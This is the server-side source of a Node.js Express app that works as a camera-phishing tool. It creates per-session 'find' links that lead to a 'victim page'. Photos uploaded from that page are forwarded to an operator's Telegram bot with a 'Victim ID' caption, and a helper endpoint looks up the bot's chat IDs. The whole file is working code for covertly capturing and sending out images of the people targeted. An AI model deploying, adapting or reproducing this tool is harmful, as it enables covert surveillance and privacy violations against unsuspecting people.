const express = require('express');
const axios = require('axios');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

const app = express();
const ADMIN_PASSWORD = "404unkown";

let sessions = {};
const tmpDir = '/tmp';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ==================== ROUTES ====================

// Home → Admin panel
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Chat ID Finder page
app.get('/chatid', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'chatid.html'));
});

// Verify admin password
app.post('/api/verify', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        return res.json({ success: true });
    }
    res.status(401).json({ error: 'Unauthorized' });
});

// Create session
app.post('/api/create-session', (req, res) => {
    const { token, chat_id } = req.body;
    if (!token || !chat_id) return res.status(400).json({ error: 'Missing fields' });

    const sessionId = uuidv4();
    sessions[sessionId] = { token, chat_id };

    res.json({
        link: `${req.protocol}://${req.get('host')}/find/${sessionId}`
    });
});

// Serve victim page
app.get('/find/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'record.html'));
});

// Handle photo upload
app.post('/api/upload/:id', (req, res, next) => {
    const storage = multer.diskStorage({
        destination: (req, file, cb) => {
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir);
            cb(null, tmpDir);
        },
        filename: (req, file, cb) => cb(null, Date.now() + '-snap.jpg')
    });
    const upload = multer({ storage: storage }).single('photo');
    upload(req, res, (err) => {
        if (err) return res.sendStatus(500);
        next();
    });
}, async (req, res) => {
    const session = sessions[req.params.id];

    if (!session || !req.file) {
        return res.sendStatus(404);
    }

    const filePath = req.file.path;

    try {
        const form = new FormData();
        form.append('chat_id', session.chat_id);
        form.append('photo', fs.createReadStream(filePath), {
            filename: 'snap.jpg',
            contentType: 'image/jpeg'
        });
        form.append('caption', `📰 BREAKING NEWS | Victim ID: ${req.params.id}`);

        await axios.post(
            `https://api.telegram.org/bot${session.token}/sendPhoto`,
            form,
            { headers: form.getHeaders() }
        );

        res.sendStatus(200);
    } catch (err) {
        console.error("Telegram Error:", err.response?.data || err.message);
        res.sendStatus(500);
    } finally {
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }
    }
});

// Chat ID Finder API
app.post('/get-chat-id', async (req, res) => {
    const { token } = req.body;

    if (!token) {
        return res.status(400).json({ error: 'Bot token is required' });
    }

    try {
        const response = await axios.get(`https://api.telegram.org/bot${token}/getUpdates`);
        const data = response.data;

        if (!data.ok) {
            return res.status(400).json({ error: 'Invalid bot token or bot not started' });
        }

        const chats = [];
        const seen = new Set();

        for (const update of data.result) {
            if (update.message && update.message.chat) {
                const chat = update.message.chat;
                if (!seen.has(chat.id)) {
                    seen.add(chat.id);
                    chats.push({
                        id: chat.id,
                        type: chat.type,
                        name: chat.title || chat.first_name || chat.username || 'Unknown',
                        username: chat.username || 'N/A'
                    });
                }
            }
        }

        if (chats.length === 0) {
            return res.json({ 
                success: true, 
                chats: [],
                message: 'No chats found. Send a message to your bot first!' 
            });
        }

        res.json({ success: true, chats });
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch chat IDs' });
    }
});

// Export for Vercel
module.exports = app;

// Local testing
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`Local dev on port ${PORT}`));
}